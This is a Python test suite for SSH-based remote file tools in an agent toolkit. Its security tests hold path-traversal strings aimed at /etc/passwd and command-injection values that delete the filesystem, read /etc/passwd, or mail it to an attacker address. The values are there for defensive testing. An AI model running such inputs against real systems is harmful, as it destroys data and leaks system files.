"""
Comprehensive test suite for remote file manipulation tools.
Tests include unit tests, integration tests, edge cases, and security tests.
"""

import unittest
from unittest.mock import Mock, patch, MagicMock
import base64
import os
import tempfile
import shutil
from typing import List

# Import all the remote file tools
from hyperbolic_agentkit_core.actions.remote_list_directory import list_remote_directory
from hyperbolic_agentkit_core.actions.remote_read_file import read_remote_file
from hyperbolic_agentkit_core.actions.remote_write_file import write_remote_file
from hyperbolic_agentkit_core.actions.remote_read_many_files import read_many_remote_files
from hyperbolic_agentkit_core.actions.remote_replace import replace_in_remote_file
from hyperbolic_agentkit_core.actions.remote_grep import grep_remote_files
from hyperbolic_agentkit_core.actions.remote_glob import glob_remote_files
from hyperbolic_agentkit_core.actions.ssh_manager import ssh_manager


class TestRemoteFileTools(unittest.TestCase):
    """Test suite for remote file manipulation tools."""
    
    def setUp(self):
        """Set up test fixtures."""
        self.mock_ssh = Mock()
        self.original_ssh = ssh_manager._ssh_client
        ssh_manager._ssh_client = self.mock_ssh
        ssh_manager._connected = True
        
    def tearDown(self):
        """Clean up after tests."""
        ssh_manager._ssh_client = self.original_ssh
        ssh_manager._connected = False

    # ========== Test SSH Connection Check ==========
    
    def test_no_ssh_connection(self):
        """Test all tools fail gracefully when no SSH connection."""
        ssh_manager._connected = False
        
        error_msg = "Error: No active SSH connection"
        
        self.assertIn(error_msg, list_remote_directory())
        self.assertIn(error_msg, read_remote_file("test.txt"))
        self.assertIn(error_msg, write_remote_file("test.txt", "content"))
        self.assertIn(error_msg, read_many_remote_files(["test.txt"]))
        self.assertIn(error_msg, replace_in_remote_file("test.txt", "old", "new"))
        self.assertIn(error_msg, grep_remote_files("pattern"))
        self.assertIn(error_msg, glob_remote_files("*.txt"))

    # ========== Test remote_list_directory ==========
    
    def test_list_directory_success(self):
        """Test successful directory listing."""
        ssh_manager.execute = Mock(return_value="""total 24
drwxr-xr-x  3 ubuntu ubuntu 4096 Jul 24 10:00 .
drwxr-xr-x 10 ubuntu ubuntu 4096 Jul 24 09:00 ..
-rw-r--r--  1 ubuntu ubuntu 1234 Jul 24 10:00 file1.txt
drwxr-xr-x  2 ubuntu ubuntu 4096 Jul 24 10:00 subdir
lrwxrwxrwx  1 ubuntu ubuntu   10 Jul 24 10:00 link -> file1.txt""")
        
        result = list_remote_directory("/test/dir")
        
        self.assertIn("Directory: /test/dir", result)
        self.assertIn("[FILE] file1.txt (1234 bytes)", result)
        self.assertIn("[DIR]  subdir", result)
        self.assertIn("[LINK] link", result)
        
    def test_list_directory_not_found(self):
        """Test listing non-existent directory."""
        ssh_manager.execute = Mock(return_value="ls: cannot access '/nonexistent': No such file or directory")
        
        result = list_remote_directory("/nonexistent")
        self.assertIn("Error: Directory '/nonexistent' not found", result)
    
    def test_list_empty_directory(self):
        """Test listing empty directory."""
        ssh_manager.execute = Mock(return_value="total 0\n")
        
        result = list_remote_directory("/empty")
        self.assertIn("Directory: /empty", result)
        self.assertIn("(empty)", result)

    # ========== Test remote_read_file ==========
    
    def test_read_file_success(self):
        """Test successful file reading."""
        ssh_manager.execute = Mock(side_effect=[
            "OK",  # File exists check
            "text/plain",  # File type check
            "Hello\nWorld\n",  # File content
            "2"  # Line count
        ])
        
        result = read_remote_file("/test.txt")
        self.assertEqual(result, "Hello\nWorld\n")
        
    def test_read_file_not_found(self):
        """Test reading non-existent file."""
        ssh_manager.execute = Mock(side_effect=[
            "ERROR",  # File exists check
            "ls: cannot access '/notfound.txt': No such file or directory"
        ])
        
        result = read_remote_file("/notfound.txt")
        self.assertIn("Error: File '/notfound.txt' not found", result)
        
    def test_read_binary_file(self):
        """Test reading binary file detection."""
        ssh_manager.execute = Mock(side_effect=[
            "OK",  # File exists check
            "application/octet-stream"  # Binary file type
        ])
        
        result = read_remote_file("/binary.bin")
        self.assertIn("Error: File '/binary.bin' appears to be binary", result)
        
    def test_read_large_file_truncation(self):
        """Test large file truncation."""
        content = "\n".join([f"Line {i}" for i in range(100)])
        ssh_manager.execute = Mock(side_effect=[
            "OK",  # File exists check
            "text/plain",  # File type
            content,  # Truncated content
            "5000"  # Total lines
        ])
        
        result = read_remote_file("/large.txt", max_lines=100)
        self.assertIn("[File truncated. Showing first 100 of 5000 lines]", result)

    # ========== Test remote_write_file ==========
    
    def test_write_file_success(self):
        """Test successful file writing."""
        def mock_execute(cmd):
            if "mkdir" in cmd:
                return ""
            elif "base64" in cmd or "echo" in cmd:
                return ""
            elif "wc -c" in cmd:
                return "13"
            return ""
        
        ssh_manager.execute = Mock(side_effect=mock_execute)
        
        result = write_remote_file("/test.txt", "Hello, World!")
        self.assertIn("Successfully written to '/test.txt' (13 bytes)", result)
        
    def test_write_file_with_special_chars(self):
        """Test writing file with special characters."""
        content = 'Line with "quotes"\nLine with \'apostrophes\'\nLine with $pecial chars!'
        encoded = base64.b64encode(content.encode('utf-8')).decode('ascii')
        
        def mock_execute(cmd):
            if "mkdir" in cmd:
                return ""
            elif "base64" in cmd or "echo" in cmd:
                return ""
            elif "wc -c" in cmd:
                return str(len(content))
            return ""
        
        ssh_manager.execute = Mock(side_effect=mock_execute)
        
        result = write_remote_file("/special.txt", content)
        self.assertIn("Successfully written to", result)
        
        # Verify base64 encoding was used for special characters
        calls = ssh_manager.execute.call_args_list
        # Find the call that contains the actual write command
        write_call_found = False
        for call in calls:
            if "base64" in str(call):
                write_call_found = True
                break
        self.assertTrue(write_call_found, "base64 encoding should be used for special characters")
        
    def test_write_file_append_mode(self):
        """Test appending to file."""
        def mock_execute(cmd):
            if "mkdir" in cmd:
                return ""
            elif "base64" in cmd or "echo" in cmd:
                return ""
            elif "wc -c" in cmd:
                return "20"
            return ""
        
        ssh_manager.execute = Mock(side_effect=mock_execute)
        
        result = write_remote_file("/test.txt", "Appended text", append=True)
        self.assertIn("Successfully appended to '/test.txt'", result)
        
    def test_write_file_permission_denied(self):
        """Test writing to protected location."""
        ssh_manager.execute = Mock(side_effect=[
            "mkdir: cannot create directory '/root/protected': Permission denied"
        ])
        
        result = write_remote_file("/root/protected/file.txt", "content")
        self.assertIn("Error: Permission denied", result)

    # ========== Test remote_read_many_files ==========
    
    def test_read_many_files_success(self):
        """Test reading multiple files."""
        ssh_manager.execute = Mock(side_effect=[
            "OK",  # file1 exists
            "Content of file 1",  # file1 content
            "1",  # file1 lines
            "OK",  # file2 exists
            "Content of file 2",  # file2 content
            "1"  # file2 lines
        ])
        
        result = read_many_remote_files(["file1.txt", "file2.txt"])
        self.assertIn("File: file1.txt", result)
        self.assertIn("Content of file 1", result)
        self.assertIn("File: file2.txt", result)
        self.assertIn("Content of file 2", result)
        
    def test_read_many_files_glob_pattern(self):
        """Test reading files with glob pattern."""
        ssh_manager.execute = Mock(side_effect=[
            "test1.py\ntest2.py\n",  # glob results
            "OK",  # test1.py exists
            "print('test1')",  # content
            "1",  # lines
            "OK",  # test2.py exists
            "print('test2')",  # content
            "1"  # lines
        ])
        
        result = read_many_remote_files(["*.py"])
        self.assertIn("test1.py", result)
        self.assertIn("test2.py", result)

    # ========== Test remote_replace ==========
    
    def test_replace_all_occurrences(self):
        """Test replacing all occurrences."""
        ssh_manager.execute = Mock(side_effect=[
            "OK",  # file exists
            "",  # backup success
            "",  # sed replace success
            "3"  # number of changes
        ])
        
        result = replace_in_remote_file("/test.txt", "old", "new", "all")
        self.assertIn("Successfully replaced 3 occurrence(s)", result)
        
    def test_replace_no_matches(self):
        """Test replace with no matches."""
        ssh_manager.execute = Mock(side_effect=[
            "OK",  # file exists
            "",  # backup success
            "",  # sed replace success
            "0"  # no changes
        ])
        
        result = replace_in_remote_file("/test.txt", "nonexistent", "new")
        self.assertIn("No occurrences of search text found", result)

    # ========== Test remote_grep ==========
    
    def test_grep_success(self):
        """Test successful pattern search."""
        ssh_manager.execute = Mock(side_effect=[
            "file1.txt:10:def test_function():\nfile2.py:20:def test_method():",
            "2"  # total matches
        ])
        
        result = grep_remote_files("def test", "/project")
        self.assertIn("Search results for 'def test'", result)
        self.assertIn("file1.txt:10:def test_function():", result)
        self.assertIn("file2.py:20:def test_method():", result)
        
    def test_grep_no_matches(self):
        """Test grep with no matches."""
        ssh_manager.execute = Mock(side_effect=[
            "",  # no results
            "0"  # count
        ])
        
        result = grep_remote_files("nonexistent pattern")
        self.assertIn("No matches found", result)

    # ========== Test remote_glob ==========
    
    def test_glob_success(self):
        """Test successful glob pattern matching."""
        ssh_manager.execute = Mock(side_effect=[
            "/home/ubuntu/project",  # pwd
            "./src/main.py\n./src/utils.py\n./tests/test_main.py",  # find results
            "3",  # total count
            "1234",  # file1 size
            "5678",  # file2 size
            "910"   # file3 size
        ])
        
        result = glob_remote_files("**/*.py", "/project")
        self.assertIn("Files matching '**/*.py'", result)
        self.assertIn("./src/main.py (1234 bytes)", result)
        
    def test_glob_no_matches(self):
        """Test glob with no matches."""
        ssh_manager.execute = Mock(side_effect=[
            "/home/ubuntu",  # pwd
            "",  # no find results
            ""   # no ls results
        ])
        
        result = glob_remote_files("*.nonexistent")
        self.assertIn("No files found matching pattern", result)

    # ========== Edge Cases and Security Tests ==========
    
    def test_path_traversal_attempt(self):
        """Test path traversal protection."""
        # These should be handled safely by the shell
        paths = ["../../../etc/passwd", "/etc/../etc/passwd", "~/../../../root"]
        
        for path in paths:
            ssh_manager.execute = Mock(return_value="")
            # Should not raise exception, but handle safely
            result = read_remote_file(path)
            # The actual behavior depends on SSH session permissions
            
    def test_command_injection_attempt(self):
        """Test command injection protection."""
        # These should be escaped properly
        malicious_inputs = [
            "test.txt; rm -rf /",
            "test.txt && cat /etc/passwd",
            "test.txt | mail attacker@evil.com < /etc/passwd"
        ]
        
        for malicious in malicious_inputs:
            ssh_manager.execute = Mock(return_value="")
            # Should handle safely without executing injected commands
            result = read_remote_file(malicious)
            
    def test_large_input_handling(self):
        """Test handling of very large inputs."""
        # Test with 10MB of data
        large_content = "A" * (10 * 1024 * 1024)
        
        def mock_execute(cmd):
            if "mkdir" in cmd:
                return ""
            elif "base64" in cmd or "echo" in cmd:
                return ""
            elif "wc -c" in cmd:
                return str(len(large_content))
            return ""
        
        ssh_manager.execute = Mock(side_effect=mock_execute)
        
        # Should handle without memory issues
        result = write_remote_file("/large.txt", large_content)
        self.assertIn("Successfully written", result)


class TestIntegrationWithDocker(unittest.TestCase):
    """Integration tests using Docker containers for real SSH testing."""
    
    @classmethod
    def setUpClass(cls):
        """Set up Docker container for integration tests."""
        # This would create a Docker container with SSH server
        # For actual implementation, you'd use docker-py
        pass
        
    def test_full_workflow(self):
        """Test complete workflow with real SSH connection."""
        # This would test:
        # 1. Connect via SSH
        # 2. Create directory structure
        # 3. Write files
        # 4. Search and read files
        # 5. Modify files
        # 6. Clean up
        pass


class TestPerformance(unittest.TestCase):
    """Performance tests for remote file operations."""
    
    def setUp(self):
        """Set up test fixtures."""
        self.mock_ssh = Mock()
        self.original_ssh = ssh_manager._ssh_client
        ssh_manager._ssh_client = self.mock_ssh
        ssh_manager._connected = True
        
    def tearDown(self):
        """Clean up after tests."""
        ssh_manager._ssh_client = self.original_ssh
        ssh_manager._connected = False
    
    def test_large_directory_listing(self):
        """Test listing directory with many files."""
        # Mock 10,000 files
        large_listing = "total 40000\n"
        for i in range(10000):
            large_listing += f"-rw-r--r-- 1 ubuntu ubuntu 100 Jul 24 10:00 file{i}.txt\n"
            
        ssh_manager.execute = Mock(return_value=large_listing)
        
        import time
        start = time.time()
        result = list_remote_directory("/large_dir")
        duration = time.time() - start
        
        # Should complete in reasonable time
        self.assertLess(duration, 1.0)  # Less than 1 second
        self.assertIn("[FILE] file0.txt", result)


if __name__ == "__main__":
    unittest.main()